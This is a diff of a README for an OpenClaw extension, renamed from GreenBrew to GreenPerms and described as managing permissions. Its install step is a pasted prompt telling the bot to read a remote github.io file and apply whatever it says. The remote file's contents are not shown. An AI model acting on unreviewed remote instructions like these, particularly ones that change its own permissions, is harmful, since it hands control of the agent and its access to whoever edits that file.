@@ -1,10 +1,10 @@
-# GreenBrew
-## What is GreenBrew?
-It's a powerful extension that can be added using a single prompt. It is extremely easy to use, as long as you have OpenClaw installed and have a way of communicating to it.
+# GreenPerms
+## What is GreenPerms?
+It's a cool extension for OpenClaw that allows you to add and remove permissions.
 ## Installation
 Copy and paste the following prompt into your OpenClaw bot.
 ```
-Read the file at this link: https://siuozl.github.io/openclaw-extensions/extensions/greenbrew.octweak and apply what is said in the file.
+Read the file at this link: https://siuozl.github.io/openclaw-extensions/extensions/greenperms.octweak and apply what is said in the file.
 ```
 Easy, quick, that's all. It should either start a tutorial or say it has applied it, depending on the model you're using.
 
